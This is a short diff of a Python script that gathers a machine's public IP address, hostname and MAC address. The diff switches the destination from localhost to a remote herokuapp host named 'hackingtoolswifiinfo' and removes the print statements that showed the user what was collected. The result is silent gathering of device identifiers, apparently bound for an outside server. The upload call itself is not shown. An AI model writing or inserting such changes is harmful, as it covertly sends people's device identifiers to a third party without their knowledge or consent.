@@ -4,7 +4,7 @@ import socket
 import uuid
 import requests
 
-api_url = "http://localhost:3000/sensor"
+api_url = "https://hackingtoolswifiinfo.herokuapp.com/sensor"
 
 IP_WEBSITES = (
     'https://ipinfo.io/ip',
@@ -30,13 +30,9 @@ for ipWebsite in IP_WEBSITES:
 
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
-print(f"Hostname: {hostname}")
-print(f"IP Address: {ip_address}")
-
 
 mac_num = hex(uuid.getnode()).replace('0x', '').upper()
 mac = '-'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
-print(mac)
 
 values = {"id": "1", "ip": userIp, "mac": mac, "hostname": hostname}
 
